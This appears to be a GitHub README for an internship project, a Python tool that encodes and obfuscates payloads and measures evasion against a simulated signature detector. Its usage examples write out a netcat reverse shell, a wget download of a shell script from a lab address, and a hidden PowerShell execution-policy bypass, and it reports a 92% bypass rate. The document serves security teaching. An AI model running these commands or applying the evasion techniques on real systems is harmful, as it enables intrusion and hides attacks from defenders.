# Custom Payload Encoder & Obfuscation Framework

> **Unified Mentor — Cybersecurity Internship | Project 2**

An educational Python framework for studying how offensive payloads are encoded and obfuscated to evade signature-based detection. Built for controlled lab environments only.

---

## Overview

Security tools like antivirus engines, EDR platforms, and firewalls rely on **signature-based detection** — making unmodified payloads straightforward to catch. This framework demonstrates how payloads are transformed using encoding and obfuscation techniques, helping both red teams understand evasion and blue teams strengthen detection rules.

> ⚠️ **Disclaimer:** This tool is strictly for educational and ethical security research. Use only in isolated lab environments. Never deploy against production systems or without explicit written authorization.

---

## Features

| Module | Techniques |
|--------|-----------|
| **Encoding** | Base64, XOR (custom key), ROT13, Multi-layer stacking |
| **Obfuscation** | Random char insertion, Split & concat, Hex escape sequences, String reversal, Case swap |
| **Evasion Testing** | 22-signature simulated detector (keyword/regex-based) |
| **Reporting** | Formatted text report, JSON export, file save |

---

## Project Structure

```
payload-obfuscation-framework/
├── payload_framework.py    # Core framework — all 4 modules + CLI
├── app.py                  # Streamlit web interface (live demo)
├── requirements.txt        # Python dependencies
├── sample_output.txt       # Sample report — powershell bypass payload
├── sample_output_2.txt     # Sample report — netcat reverse shell
├── sample_output_3.txt     # Sample report — Python os.system shell
└── README.md
```

---

## Installation

```bash
git clone https://github.com/apj396/payload-obfuscation-framework.git
cd payload-obfuscation-framework
pip install -r requirements.txt
```

No external dependencies for the CLI — uses Python standard library only.

---

## Usage

### Full pipeline (default payload)
```bash
python payload_framework.py
```

### Custom payload
```bash
python payload_framework.py -p "cmd.exe /c whoami"
python payload_framework.py -p "nc -e /bin/bash 10.0.0.1 4444" -k 0x55
```

### Save report to file
```bash
python payload_framework.py -p "wget http://10.0.0.1/shell.sh" -o report.txt
```

### Single encode / decode
```bash
python payload_framework.py --encode-only base64 -p "shellcode string"
python payload_framework.py --decode base64 -p "c2hlbGxjb2Rl"
python payload_framework.py --encode-only xor -k 0x41 -p "payload"
python payload_framework.py --decode rot13 -p "pzq.rkr /p"
```

### Demo mode — all 5 sample payloads
```bash
python payload_framework.py --demo
```

### JSON export
```bash
python payload_framework.py --json -p "wget http://10.0.0.1/shell.sh"
```

### Web interface (Streamlit)
```bash
streamlit run app.py
```

---

## Sample Output

```
══════════════════════════════════════════════════════════════════════
  CUSTOM PAYLOAD ENCODER & OBFUSCATION FRAMEWORK
  Unified Mentor — Cybersecurity Project 2
  Report Generated : June 2026
  XOR Key          : 0x41 (65)
══════════════════════════════════════════════════════════════════════

  [ORIGINAL PAYLOAD]
  Payload  : cmd.exe /c powershell -exec bypass -nop -w hidden
  Verdict  : DETECTED
  Matched  : cmd.exe, powershell

  Technique                                Verdict      Matches
  ────────────────────────────────────────────────────────────────────
  Base64 Encoded                           BYPASSED     0
  XOR Encoded (key=0x41)                   BYPASSED     0
  ROT13 Encoded                            BYPASSED     0
  Base64 → XOR (multi-layer)               BYPASSED     0
  ROT13 → Base64 (multi-layer)             BYPASSED     0
  XOR → Base64 → ROT13 (3-layer)           BYPASSED     0
  Obfuscation: Random Char Insertion       BYPASSED     0
  Obfuscation: Split & Concat              BYPASSED     0
  Obfuscation: Hex Escape Sequences        BYPASSED     0
  Obfuscation: String Reversal             BYPASSED     0
  Obfuscation: Case Swap                   DETECTED     2
  Base64 + Escape Obfuscation (hybrid)     BYPASSED     0
  XOR + Split-Concat Obfuscation (hybrid)  BYPASSED     0

  Detection Bypassed : 12/13  (92.3%)
══════════════════════════════════════════════════════════════════════
```

---

## Architecture

```
Input Payload
      │
      ▼
┌─────────────────┐     ┌──────────────────────┐
│  Encoding Module │────▶│  Obfuscation Module   │
│  Base64 / XOR /  │     │  Insert / Split /     │
│  ROT13 / Multi   │     │  Escape / Reverse /   │
└─────────────────┘     │  Case Swap             │
                        └──────────────────────┘
                                  │
                                  ▼
                        ┌──────────────────────┐
                        │  Evasion Testing      │
                        │  22 regex signatures  │
                        └──────────────────────┘
                                  │
                                  ▼
                        ┌──────────────────────┐
                        │  Reporting Engine     │
                        │  Text / JSON / File   │
                        └──────────────────────┘
```

---

## Evasion Effectiveness

Tested against a 22-signature simulated detector:

- **12/13 techniques** bypass detection (92.3%)
- Case swap is the only technique detected — because real AV engines use case-insensitive matching
- Multi-layer encoding produces fully opaque output with zero signature hits
- This demonstrates why layered, behavioural security is necessary alongside signature detection

---

## Technologies Used

- Python 3.x
- `base64` — standard library encoding
- `re` — regex-based signature simulation
- `random` — probabilistic obfuscation
- `argparse` — CLI interface
- `json` — structured output
- `streamlit` — web interface

---

## Learning Outcomes

- How encoding transforms payloads to defeat static keyword scanning
- XOR, Base64, and ROT13 implementation from first principles
- String obfuscation techniques used in real threat actor toolkits
- Limitations of signature-only detection and why layered security matters
- Building modular, CLI-driven Python security tools

---

## License

This project is for educational purposes only. No license is granted for offensive use.
